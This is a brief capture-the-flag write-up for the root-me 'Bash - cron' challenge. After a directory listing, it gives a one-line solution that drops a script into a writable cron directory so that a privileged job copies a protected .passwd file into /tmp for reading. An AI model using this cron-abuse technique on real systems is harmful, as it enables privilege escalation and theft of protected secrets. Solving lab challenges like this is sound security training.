# Bash: cron

[root-me challenge: Bash - cron](https://www.root-me.org/en/Challenges/App-Script/Bash-cron): Challenge connection information.

----

```text
$ ls -la
total 24
dr-xr-x---  2 app-script-ch4-cracked app-script-ch4         4096 Dec 10  2021 .
drwxr-xr-x 24 root                   root                   4096 Mar 22 15:29 ..
-r-xr-x---  1 app-script-ch4-cracked app-script-ch4          767 Dec 10  2021 ch4
lrwxrwxrwx  1 root                   root                     11 Dec 10  2021 cron.d -> /tmp/._cron
-rw-r-----  1 root                   root                     42 Dec 10  2021 .git
-r--r-----  1 app-script-ch4-cracked app-script-ch4-cracked   16 Dec 10  2021 .passwd
-r--------  1 root                   root                    629 Dec 10  2021 ._perms
```

```text
echo '#!/bin/sh\ncat .passwd > /tmp/whatever' > cron.d/task1;chmod 4777 cron.d/task1
```

Wait for it and cat `/tmp/whatever`.
